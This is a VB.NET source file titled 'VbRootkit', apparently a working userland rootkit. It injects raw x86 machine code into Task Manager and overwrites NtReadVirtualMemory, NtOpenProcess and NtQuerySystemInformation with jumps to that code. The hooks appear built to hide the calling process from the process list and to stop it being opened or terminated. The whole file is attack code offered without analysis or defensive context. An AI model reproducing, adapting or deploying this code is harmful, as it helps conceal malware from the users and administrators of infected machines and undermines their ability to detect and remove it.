Module VbRootkit

#Region "WinAPI's"

    Private Declare Function CloseHandle Lib "kernel32" (ByVal pHandle As IntPtr) As Boolean
    Private Declare Function OpenProcess Lib "kernel32" (ByVal dwDesiredAccess As Integer, ByVal bInheritHandle As Boolean, ByVal dwProcessId As UInteger) As IntPtr
    Private Declare Function ReadProcessMemory Lib "kernel32" (ByVal hProcess As IntPtr, ByVal lpBaseAddress As IntPtr, <Runtime.InteropServices.Out()> ByVal lpBuffer As Byte(), ByVal nSize As UInteger, ByRef lpNumberOfBytesRead As UInteger) As Boolean
    Private Declare Function WriteProcessMemory Lib "kernel32" (ByVal hProcess As IntPtr, ByVal lpBaseAddress As IntPtr, ByVal lpBuffer As Byte(), ByVal nSize As UInteger, ByRef lpNumberOfBytesWritten As UInteger) As Boolean
    Private Declare Function VirtualProtectEx Lib "kernel32" (ByVal hProcess As IntPtr, ByVal lpAddress As IntPtr, ByVal dwSize As UInteger, ByVal flNewProtect As UInteger, ByRef lpflOldProtect As UInteger) As Boolean

    Private Declare Function Module32Next Lib "kernel32" (ByVal hSnapshot As IntPtr, ByRef lpme As MODULEENTRY32) As Boolean
    Private Declare Function Module32First Lib "kernel32" (ByVal hSnapshot As IntPtr, ByRef lpme As MODULEENTRY32) As Boolean
    Private Declare Function CreateToolhelp32Snapshot Lib "kernel32" (ByVal dwFlags As UInteger, ByVal u32ProcessId As UInteger) As IntPtr

    Private Declare Function VirtualAllocEx Lib "kernel32" (
        ByVal hProcess As IntPtr,
        ByVal lpAddress As IntPtr,
        ByVal dwSize As UInteger,
        ByVal flAllocationType As UInteger,
        ByVal flProtect As UInteger) As IntPtr

#End Region

#Region "Structures"

    Structure MODULEENTRY32
        Dim U32Size As UInteger
        Dim Th32ModuleId As UInteger
        Dim Th32ProcessId As UInteger
        Dim GlblcntUsage As UInteger
        Dim ProccntUsage As UInteger
        Dim ModBaseAddr As IntPtr
        Dim ModBaseSize As UInteger
        Dim HModule As IntPtr
        <Runtime.InteropServices.MarshalAs(Runtime.InteropServices.UnmanagedType.ByValTStr, SizeConst:=256)> Dim SzModule As String
        <Runtime.InteropServices.MarshalAs(Runtime.InteropServices.UnmanagedType.ByValTStr, SizeConst:=260)> Dim SzeExePath As String
    End Structure

#End Region
    Sub Main()
        Console.Title = "Proccess Killer"
        'Console.WriteLine("Press enter, and the hook will be done!")
        'Console.ReadLine()
        HookApplication("Taskmgr.exe")
        Console.ReadLine()
    End Sub

    Private Function ReadMemoryByte(ByVal hProcess As IntPtr, ByVal lpBaseAddress As IntPtr, ByVal nSize As UInteger) As Byte()
        Dim Buffer(CInt(nSize - 1)) As Byte
        ReadProcessMemory(hProcess, lpBaseAddress, Buffer, nSize, Nothing)
        Return Buffer
    End Function

    Private Function RemoteGetProcAddressManual(ByVal hProcess As IntPtr, ByVal ModuleAddress As UInteger, ByVal Export As String) As UInteger

        'PE Header relative declarations
        Dim PEHeaderOffset As UInteger = BitConverter.ToUInt32(ReadMemoryByte(hProcess, CType(ModuleAddress + &H3C, IntPtr), 4), 0)
        Dim ExportRVA As UInteger = BitConverter.ToUInt32(ReadMemoryByte(hProcess, CType(ModuleAddress + PEHeaderOffset + &H78, IntPtr), 4), 0)
        Dim IExportDir() As Byte = ReadMemoryByte(hProcess, CType(ModuleAddress + ExportRVA, IntPtr), 40)
        Dim NamesCnt As Integer = BitConverter.ToInt32(IExportDir, 24)
        Dim Names As UInteger = BitConverter.ToUInt32(IExportDir, 32) + ModuleAddress
        Dim FuncAddress As UInteger = BitConverter.ToUInt32(IExportDir, 28) + ModuleAddress
        Dim Ordinals As UInteger = BitConverter.ToUInt32(IExportDir, 36) + ModuleAddress

        'Empty declarations to use later
        Dim tpAddress, ApiAddress, Ord As UInteger
        Dim ApiString As String = Nothing
        Dim Ptr As IntPtr = Runtime.InteropServices.Marshal.AllocHGlobal(64)

        'Searching for the Export
        For i = 1 To NamesCnt
            tpAddress = BitConverter.ToUInt32(ReadMemoryByte(hProcess, CType(Names + ((i - 1) * 4), IntPtr), 4), 0)
            Runtime.InteropServices.Marshal.Copy(ReadMemoryByte(hProcess, CType(ModuleAddress + tpAddress, IntPtr), 64), 0, Ptr, 64)
            ApiString = Runtime.InteropServices.Marshal.PtrToStringAnsi(Ptr)
            Ord = BitConverter.ToInt16(ReadMemoryByte(hProcess, CType(Ordinals + ((i - 1) * 2), IntPtr), 2), 0)
            ApiAddress = BitConverter.ToUInt32(ReadMemoryByte(hProcess, CType(FuncAddress + (Ord * 4), IntPtr), 4), 0) + ModuleAddress

            If String.Compare(ApiString, Export, True) = 0 Then
                Runtime.InteropServices.Marshal.FreeHGlobal(Ptr)
                Return ApiAddress
            End If

        Next

        Runtime.InteropServices.Marshal.FreeHGlobal(Ptr)
        Return Nothing

    End Function

    Private Function GetModuleBaseAddress(ByVal strProcess As String, ByVal strModule As String) As IntPtr
        Dim hSnapshot As IntPtr = CreateToolhelp32Snapshot(&H18, CUInt(Diagnostics.Process.GetProcessesByName(strProcess)(0).Id))
        If hSnapshot = Nothing Then Return Nothing
        Dim me32Modules As New MODULEENTRY32
        me32Modules.U32Size = CUInt(Runtime.InteropServices.Marshal.SizeOf(me32Modules))
        If Module32First(hSnapshot, me32Modules) Then
            Do
                If Not me32Modules.ModBaseAddr.ToInt64 > &H7FFFFFFF Then
                    If String.Compare(strModule, me32Modules.SzModule, True) = 0 Then Return me32Modules.ModBaseAddr
                Else
                End If
            Loop While (Module32Next(hSnapshot, me32Modules))
        End If
        Return Nothing
    End Function

    Private Function CalculateOffset(ByVal DesAddress As Integer, ByVal SrcAddress As Integer) As Integer
        Return (DesAddress - SrcAddress) - 5
    End Function

    Sub HookApplication(ByVal ProcessName As String)
        Const VariablesSize As Integer = 96
        Dim ProcessHandle As IntPtr
        Dim MemoryBlockPtr As UInteger
        Dim Variables() As Byte = New Byte(VariablesSize) {}
        Dim fpGetProcessId As UInteger
        Dim fpGetCurrentProcessId As UInteger
        Dim lpProtectedAddress(3) As UInteger
        Dim ProtectedBuffer(3)() As Byte
        Dim OldProtect As UInteger = Nothing
        Dim WriteOffset As UInteger = Nothing
        Dim JmpOpCode() As Byte = {&HE9, Nothing, Nothing, Nothing, Nothing}
        Dim OpCodes()() As Byte = {NtReadVirtualMemory_AsmOpCode, NtOpenProcess_AsmOpCode, NtQuerySystemInformation_AsmOpCode}
        Dim OpCodesSize As UInteger = OpCodes(0).Length + OpCodes(1).Length + OpCodes(2).Length

        'Alloc memory for our opcode and variables
        ProcessHandle = OpenProcess(&H8 + &H10 + &H20, False, CUInt(Diagnostics.Process.GetProcessesByName(ProcessName)(0).Id))
        MemoryBlockPtr = CInt(VirtualAllocEx(ProcessHandle, Nothing, OpCodesSize + VariablesSize, &H3000, &H40))

        'Fill-in variables
        fpGetProcessId = CInt(RemoteGetProcAddressManual(ProcessHandle, CInt(GetModuleBaseAddress(ProcessName, "kernel32.dll")), "GetProcessId"))
        fpGetCurrentProcessId = CInt(RemoteGetProcAddressManual(ProcessHandle, CInt(GetModuleBaseAddress(ProcessName, "kernel32.dll")), "GetCurrentProcessId"))
        lpProtectedAddress(0) = CInt(RemoteGetProcAddressManual(ProcessHandle, CInt(GetModuleBaseAddress(ProcessName, "ntdll.dll")), "NtReadVirtualMemory"))
        lpProtectedAddress(1) = CInt(RemoteGetProcAddressManual(ProcessHandle, CInt(GetModuleBaseAddress(ProcessName, "ntdll.dll")), "NtOpenProcess"))
        lpProtectedAddress(2) = CInt(RemoteGetProcAddressManual(ProcessHandle, CInt(GetModuleBaseAddress(ProcessName, "ntdll.dll")), "NtQuerySystemInformation"))
        ProtectedBuffer(0) = ReadMemoryByte(ProcessHandle, CType(lpProtectedAddress(0), IntPtr), 24)
        ProtectedBuffer(1) = ReadMemoryByte(ProcessHandle, CType(lpProtectedAddress(1), IntPtr), 24)
        ProtectedBuffer(2) = ReadMemoryByte(ProcessHandle, CType(lpProtectedAddress(2), IntPtr), 24)
        BitConverter.GetBytes(fpGetProcessId).CopyTo(Variables, 0)
        BitConverter.GetBytes(fpGetCurrentProcessId).CopyTo(Variables, 4)
        BitConverter.GetBytes(Diagnostics.Process.GetCurrentProcess.Id).CopyTo(Variables, 8)
        BitConverter.GetBytes(lpProtectedAddress(0)).CopyTo(Variables, 12)
        BitConverter.GetBytes(lpProtectedAddress(1)).CopyTo(Variables, 16)
        BitConverter.GetBytes(lpProtectedAddress(2)).CopyTo(Variables, 20)
        ProtectedBuffer(0).CopyTo(Variables, 24)
        ProtectedBuffer(1).CopyTo(Variables, 24 + 24)
        ProtectedBuffer(2).CopyTo(Variables, 24 + 24 + 24)

        'Write variables and opcode to memory block
        WriteOffset = MemoryBlockPtr
        WriteProcessMemory(ProcessHandle, WriteOffset, Variables, VariablesSize, Nothing)
        WriteOffset += VariablesSize
        For i = 0 To OpCodes.Length - 1
            WriteProcessMemory(ProcessHandle, WriteOffset, OpCodes(i), CUInt(OpCodes(i).Length), Nothing)
            WriteOffset += OpCodes(i).Length
        Next

        'Set memory page to execute code
        VirtualProtectEx(ProcessHandle, MemoryBlockPtr, OpCodesSize + VariablesSize, &H10, 0)

        'Hook NtReadVirtualMemory
        WriteOffset = MemoryBlockPtr + VariablesSize
        BitConverter.GetBytes(CalculateOffset(WriteOffset, lpProtectedAddress(0))).CopyTo(JmpOpCode, 1)
        VirtualProtectEx(ProcessHandle, CType(lpProtectedAddress(0), IntPtr), CUInt(JmpOpCode.Length), &H40, OldProtect)
        WriteProcessMemory(ProcessHandle, CType(lpProtectedAddress(0), IntPtr), JmpOpCode, CUInt(JmpOpCode.Length), Nothing)
        VirtualProtectEx(ProcessHandle, CType(lpProtectedAddress(0), IntPtr), CUInt(JmpOpCode.Length), OldProtect, 0)

        'Hook NtOpenProcess
        WriteOffset += OpCodes(0).Length
        BitConverter.GetBytes(CalculateOffset(WriteOffset, lpProtectedAddress(1))).CopyTo(JmpOpCode, 1)
        VirtualProtectEx(ProcessHandle, CType(lpProtectedAddress(1), IntPtr), CUInt(JmpOpCode.Length), &H40, OldProtect)
        WriteProcessMemory(ProcessHandle, CType(lpProtectedAddress(1), IntPtr), JmpOpCode, CUInt(JmpOpCode.Length), Nothing)
        VirtualProtectEx(ProcessHandle, CType(lpProtectedAddress(1), IntPtr), CUInt(JmpOpCode.Length), OldProtect, 0)

        'Hook NtQuerySystemInformation
        WriteOffset += OpCodes(1).Length
        BitConverter.GetBytes(CalculateOffset(WriteOffset, lpProtectedAddress(2))).CopyTo(JmpOpCode, 1)
        VirtualProtectEx(ProcessHandle, CType(lpProtectedAddress(2), IntPtr), CUInt(JmpOpCode.Length), &H40, OldProtect)
        WriteProcessMemory(ProcessHandle, CType(lpProtectedAddress(2), IntPtr), JmpOpCode, CUInt(JmpOpCode.Length), Nothing)
        VirtualProtectEx(ProcessHandle, CType(lpProtectedAddress(2), IntPtr), CUInt(JmpOpCode.Length), OldProtect, 0)

        ' clean up
        CloseHandle(ProcessHandle)

    End Sub

#Region "AsmOpCode"

    Private NtReadVirtualMemory_AsmOpCode As Byte() = {
        &H55, &H8B, &HEC, &H83, &HEC, &H14, &H56, &HC7, &H45, &HF8, &H1, &H0, &H0, &HC0, &HE8, &H0,
        &H0, &H0, &H0, &H58, &H25, &H0, &HF0, &HFF, &HFF, &H89, &H45, &HFC, &HFF, &H75, &H18, &HFF,
        &H75, &H14, &HFF, &H75, &H10, &HFF, &H75, &HC, &HFF, &H75, &H8, &H8B, &H45, &HFC, &H83, &HC0,
        &H18, &HFF, &HD0, &H89, &H45, &HF8, &H83, &H7D, &HF8, &H0, &HF, &H8C, &HA8, &H0, &H0, &H0,
        &HFF, &H75, &H8, &H8B, &H45, &HFC, &HFF, &H10, &H8B, &HF0, &H8B, &H45, &HFC, &HFF, &H50, &H4,
        &H3B, &HF0, &H74, &HA, &H83, &H7D, &H8, &HFF, &HF, &H85, &H8A, &H0, &H0, &H0, &H83, &H65,
        &HF4, &H0, &HEB, &H7, &H8B, &H45, &HF4, &H40, &H89, &H45, &HF4, &H83, &H7D, &HF4, &H3, &H73,
        &H77, &H8B, &H45, &HF4, &H8B, &H4D, &HFC, &H83, &H7C, &H81, &HC, &H0, &H74, &H65, &H8B, &H45,
        &HF4, &H8B, &H4D, &HFC, &H8B, &H44, &H81, &HC, &H3B, &H45, &HC, &H72, &H56, &H8B, &H45, &HC,
        &H3, &H45, &H14, &H8B, &H4D, &HF4, &H8B, &H55, &HFC, &H39, &H44, &H8A, &HC, &H73, &H44, &H8B,
        &H45, &HF4, &H8B, &H4D, &HFC, &H8B, &H44, &H81, &HC, &H2B, &H45, &HC, &H89, &H45, &HF0, &H83,
        &H65, &HEC, &H0, &HEB, &H7, &H8B, &H45, &HEC, &H40, &H89, &H45, &HEC, &H83, &H7D, &HEC, &H18,
        &H73, &H21, &H8B, &H45, &HF4, &H6B, &HC0, &H18, &H8B, &H4D, &HFC, &H8D, &H44, &H1, &H18, &H8B,
        &H4D, &HEC, &H3, &H4D, &HF0, &H8B, &H55, &H10, &H8B, &H75, &HEC, &H8A, &H4, &H30, &H88, &H4,
        &HA, &HEB, &HD2, &HE9, &H7C, &HFF, &HFF, &HFF, &H8B, &H45, &HF8, &H5E, &HC9, &HC2, &H14, &H0}

    Private NtOpenProcess_AsmOpCode As Byte() = {
        &H55, &H8B, &HEC, &H51, &H51, &HC7, &H45, &HF8, &H1, &H0, &H0, &HC0, &HE8, &H0, &H0, &H0,
        &H0, &H58, &H25, &H0, &HF0, &HFF, &HFF, &H89, &H45, &HFC, &H83, &H7D, &H14, &H0, &H74, &H16,
        &H8B, &H45, &H14, &H8B, &H4D, &HFC, &H8B, &H0, &H3B, &H41, &H8, &H75, &H9, &HC7, &H45, &HF8,
        &H22, &H0, &H0, &HC0, &HEB, &H17, &HFF, &H75, &H14, &HFF, &H75, &H10, &HFF, &H75, &HC, &HFF,
        &H75, &H8, &H8B, &H45, &HFC, &H83, &HC0, &H30, &HFF, &HD0, &H89, &H45, &HF8, &H8B, &H45, &HF8,
        &HC9, &HC2, &H10, &H0}

    Private NtQuerySystemInformation_AsmOpCode As Byte() = {
        &H55, &H8B, &HEC, &H83, &HEC, &H1C, &H56, &H57, &HC7, &H45, &HEC, &H1, &H0, &H0, &HC0, &HE8,
        &H0, &H0, &H0, &H0, &H58, &H25, &H0, &HF0, &HFF, &HFF, &H89, &H45, &HF0, &HFF, &H75, &H14,
        &HFF, &H75, &H10, &HFF, &H75, &HC, &HFF, &H75, &H8, &H8B, &H45, &HF0, &H83, &HC0, &H48, &HFF,
        &HD0, &H89, &H45, &HEC, &H83, &H7D, &HEC, &H0, &HF, &H8C, &H4E, &H1, &H0, &H0, &H83, &H7D,
        &H8, &H5, &H75, &H5D, &H83, &H65, &HF8, &H0, &H8B, &H45, &HC, &H89, &H45, &HF4, &H8B, &H45,
        &HF4, &H83, &H38, &H0, &H74, &H46, &H8B, &H45, &HF4, &H89, &H45, &HF8, &H8B, &H45, &HF8, &H8B,
        &H4D, &HF8, &H3, &H8, &H89, &H4D, &HF4, &H8B, &H45, &HF4, &H8B, &H4D, &HF0, &H8B, &H40, &H44,
        &H3B, &H41, &H8, &H75, &H25, &H8B, &H45, &HF4, &H83, &H38, &H0, &H75, &H8, &H8B, &H45, &HF8,
        &H83, &H20, &H0, &HEB, &HF, &H8B, &H45, &HF8, &H8B, &H0, &H8B, &H4D, &HF4, &H3, &H1, &H8B,
        &H4D, &HF8, &H89, &H1, &H8B, &H45, &HF8, &H89, &H45, &HF4, &HEB, &HB2, &HE9, &HEB, &H0, &H0,
        &H0, &H83, &H7D, &H8, &H10, &HF, &H85, &HE1, &H0, &H0, &H0, &H8B, &H45, &HC, &H89, &H45,
        &HFC, &H83, &H65, &HE8, &H0, &HEB, &H7, &H8B, &H45, &HE8, &H40, &H89, &H45, &HE8, &H8B, &H45,
        &HFC, &H8B, &H4D, &HE8, &H3B, &H8, &HF, &H83, &HC0, &H0, &H0, &H0, &H8B, &H45, &HE8, &HC1,
        &HE0, &H4, &H8B, &H4D, &HFC, &H8B, &H55, &HF0, &H8B, &H44, &H1, &H4, &H3B, &H42, &H8, &HF,
        &H85, &HA2, &H0, &H0, &H0, &H8B, &H45, &HE8, &HC1, &HE0, &H4, &H8B, &H4D, &HFC, &HC6, &H44,
        &H1, &H9, &H0, &H8B, &H45, &HE8, &HC1, &HE0, &H4, &H8B, &H4D, &HFC, &H83, &H64, &H1, &H10,
        &H0, &H8B, &H45, &HE8, &HC1, &HE0, &H4, &H33, &HC9, &H8B, &H55, &HFC, &H66, &H89, &H4C, &H2,
        &HA, &H8B, &H45, &HE8, &HC1, &HE0, &H4, &H8B, &H4D, &HFC, &H83, &H64, &H1, &HC, &H0, &H8B,
        &H45, &HE8, &HC1, &HE0, &H4, &H8B, &H4D, &HFC, &HC6, &H44, &H1, &H8, &H0, &H8B, &H45, &HE8,
        &HC1, &HE0, &H4, &H8B, &H4D, &HFC, &H83, &H64, &H1, &H4, &H0, &H8B, &H45, &HE8, &H89, &H45,
        &HE4, &HEB, &H7, &H8B, &H45, &HE4, &H40, &H89, &H45, &HE4, &H8B, &H45, &HFC, &H8B, &H4D, &HE4,
        &H3B, &H8, &H73, &H21, &H8B, &H45, &HE4, &H40, &HC1, &HE0, &H4, &H8B, &H4D, &HFC, &H8D, &H74,
        &H1, &H4, &H8B, &H45, &HE4, &HC1, &HE0, &H4, &H8B, &H4D, &HFC, &H8D, &H7C, &H1, &H4, &HA5,
        &HA5, &HA5, &HA5, &HEB, &HCE, &H8B, &H45, &HFC, &H8B, &H0, &H48, &H8B, &H4D, &HFC, &H89, &H1,
        &H8B, &H45, &HE8, &H48, &H89, &H45, &HE8, &HE9, &H2B, &HFF, &HFF, &HFF, &H8B, &H45, &HEC, &H5F,
        &H5E, &HC9, &HC2, &H10, &H0}

#End Region
End Module
